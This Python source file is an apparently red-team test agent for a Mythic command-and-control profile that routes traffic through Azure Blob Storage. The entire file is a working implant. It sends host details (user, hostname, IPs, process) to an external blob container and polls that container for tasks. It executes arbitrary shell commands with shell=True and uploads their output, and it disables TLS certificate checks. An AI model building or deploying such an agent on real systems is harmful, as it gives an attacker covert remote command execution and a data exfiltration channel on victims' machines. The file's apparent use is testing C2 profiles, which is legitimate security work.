#!/usr/bin/env python3
"""
Azure Blob Storage Test Agent
Minimal agent for testing Azure Blob C2 profile communications.
"""

import json
import time
import random
import base64
import urllib.request
import urllib.error
import ssl
import uuid as uuid_lib
import socket
import platform
import os
import sys

# Configuration - Stamped at build time
BLOB_ENDPOINT = "BLOB_ENDPOINT_PLACEHOLDER"
CONTAINER_NAME = "CONTAINER_NAME_PLACEHOLDER"
CONTAINER_SAS = "CONTAINER_SAS_PLACEHOLDER"
CALLBACK_INTERVAL = int("CALLBACK_INTERVAL_PLACEHOLDER" or "30")
CALLBACK_JITTER = int("CALLBACK_JITTER_PLACEHOLDER" or "10")
AGENT_UUID = "AGENT_UUID_PLACEHOLDER"
AES_KEY = "AES_KEY_PLACEHOLDER"


class AzureBlobAgent:
    def __init__(self):
        self.uuid = AGENT_UUID
        self.blob_endpoint = BLOB_ENDPOINT
        self.container_name = CONTAINER_NAME
        self.sas_token = CONTAINER_SAS
        self.callback_interval = CALLBACK_INTERVAL
        self.callback_jitter = CALLBACK_JITTER
        self.checked_in = False

        # Disable SSL verification for testing (remove in production)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def get_blob_url(self, blob_path: str) -> str:
        """Construct full blob URL with SAS token"""
        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"

    def put_blob(self, blob_path: str, data: bytes) -> bool:
        """Upload data to a blob"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                data=data,
                method="PUT",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(len(data)),
                }
            )
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.status in (200, 201)
        except Exception as e:
            print(f"[!] PUT blob error: {e}")
            return False

    def get_blob(self, blob_path: str) -> bytes:
        """Download blob data"""
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return b""  # Blob not found
            print(f"[!] GET blob error: {e}")
            return b""
        except Exception as e:
            print(f"[!] GET blob error: {e}")
            return b""

    def get_checkin_data(self) -> dict:
        """Build checkin message for Mythic"""
        return {
            "action": "checkin",
            "uuid": self.uuid,
            "ips": self._get_ips(),
            "os": platform.system().lower(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "host": socket.gethostname(),
            "pid": os.getpid(),
            "architecture": platform.machine(),
            "domain": "",
            "integrity_level": 2,
            "external_ip": "",
            "process_name": sys.executable,
        }

    def _get_ips(self) -> list:
        """Get local IP addresses"""
        ips = []
        try:
            hostname = socket.gethostname()
            ips = socket.gethostbyname_ex(hostname)[2]
        except Exception:
            ips = ["127.0.0.1"]
        return ips

    def checkin(self) -> bool:
        """Perform initial checkin"""
        print(f"[*] Checking in as {self.uuid}")
        checkin_data = self.get_checkin_data()
        encoded = base64.b64encode(json.dumps(checkin_data).encode()).decode()

        # Write checkin blob
        if self.put_blob("checkin.blob", encoded.encode()):
            print("[+] Checkin blob written")
            self.checked_in = True
            return True
        else:
            print("[-] Failed to write checkin blob")
            return False

    def get_tasking(self) -> list:
        """Get pending tasks from server"""
        data = self.get_blob("tasking/pending.blob")
        if not data:
            return []

        try:
            decoded = base64.b64decode(data).decode()
            tasking = json.loads(decoded)
            return tasking.get("tasks", [])
        except Exception as e:
            print(f"[!] Failed to parse tasking: {e}")
            return []

    def post_response(self, task_id: str, response_data: dict) -> bool:
        """Post task response to server"""
        response = {
            "action": "post_response",
            "responses": [response_data]
        }
        encoded = base64.b64encode(json.dumps(response).encode()).decode()

        blob_name = f"response/{task_id}.blob"
        return self.put_blob(blob_name, encoded.encode())

    def execute_task(self, task: dict) -> dict:
        """Execute a task and return response"""
        task_id = task.get("id", str(uuid_lib.uuid4()))
        command = task.get("command", "")
        parameters = task.get("parameters", "")

        print(f"[*] Executing task {task_id}: {command}")

        response = {
            "task_id": task_id,
            "user_output": "",
            "completed": True,
            "status": "success",
        }

        try:
            if command == "shell":
                # Execute shell command
                import subprocess
                result = subprocess.run(
                    parameters,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                response["user_output"] = result.stdout + result.stderr

            elif command == "whoami":
                response["user_output"] = f"{os.getenv('USER') or os.getenv('USERNAME')}@{socket.gethostname()}"

            elif command == "pwd":
                response["user_output"] = os.getcwd()

            elif command == "hostname":
                response["user_output"] = socket.gethostname()

            elif command == "exit":
                response["user_output"] = "Agent exiting..."
                self.post_response(task_id, response)
                sys.exit(0)

            else:
                response["user_output"] = f"Unknown command: {command}"
                response["status"] = "error"

        except Exception as e:
            response["user_output"] = f"Error: {str(e)}"
            response["status"] = "error"
            response["completed"] = True

        return response

    def get_sleep_time(self) -> int:
        """Calculate sleep time with jitter"""
        jitter_range = self.callback_interval * (self.callback_jitter / 100)
        jitter = random.uniform(-jitter_range, jitter_range)
        return max(1, int(self.callback_interval + jitter))

    def run(self):
        """Main agent loop"""
        print(f"[*] Azure Blob Test Agent starting")
        print(f"[*] Endpoint: {self.blob_endpoint}")
        print(f"[*] Container: {self.container_name}")
        print(f"[*] Interval: {self.callback_interval}s (jitter: {self.callback_jitter}%)")

        # Initial checkin
        while not self.checked_in:
            if self.checkin():
                break
            print("[*] Retrying checkin in 5 seconds...")
            time.sleep(5)

        # Main loop
        while True:
            try:
                # Get tasking
                tasks = self.get_tasking()

                for task in tasks:
                    # Execute task
                    response = self.execute_task(task)

                    # Post response
                    if self.post_response(task["id"], response):
                        print(f"[+] Response posted for task {task['id']}")
                    else:
                        print(f"[-] Failed to post response for task {task['id']}")

            except Exception as e:
                print(f"[!] Main loop error: {e}")

            # Sleep with jitter
            sleep_time = self.get_sleep_time()
            time.sleep(sleep_time)


if __name__ == "__main__":
    agent = AzureBlobAgent()
    agent.run()
